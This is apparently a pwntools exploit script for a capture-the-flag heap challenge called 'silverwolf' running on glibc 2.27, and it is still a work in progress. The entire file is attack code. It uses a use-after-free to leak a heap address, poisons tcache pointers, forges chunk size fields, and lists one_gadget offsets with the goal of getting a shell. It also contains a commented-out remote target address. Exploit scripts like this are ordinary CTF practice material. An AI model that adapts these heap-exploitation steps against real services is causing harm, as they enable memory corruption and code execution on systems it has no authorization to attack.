from pwn import *
context.log_level = "debug"
p = process("./silverwolf")
#p = remote("123.60.215.79","21937")
libc = ELF("./libc/libc-2.27.so")
one_gad = [0x4f3d5,0x4f432,0x10a41c]
def dbg():
    gdb.attach(p)
    pause()

def choice(num):
	p.sendlineafter("Your choice: ",str(num))

def add(size):
    choice(1)
    p.sendlineafter(":",str(0))
    p.sendlineafter(":",str(size))

def edit(context = "aaa"):
    choice(2)
    p.sendlineafter(":",str(0))
    p.sendlineafter(":",context)

def show():
    choice(3)
    p.sendlineafter(":",str(0))

def delete():
    choice(4)
    p.sendlineafter(":",str(0))


add(0x8)
delete()
edit("a"*8)

show()

p.recvuntil("aaaaaaaa")
leakaddr = u64(p.recv(6).ljust(8,"\x00"))
print(hex(leakaddr))

edit(p64(leakaddr + 0xe30))

add(0x10)
edit(p64(0) + p64(0x11))
add(0x10)

edit(p64(0) +p64(0x91))

add(0x10)
delete()
edit(p64(leakaddr + 8*12))

dbg()

add(0x8)
add(0x8)
edit(p64(leakaddr + 0xe30))

dbg()

add(0x48)
delete()

dbg()

'''
dbg()

delete()
edit("0")

dbg()

'''
p.interactive()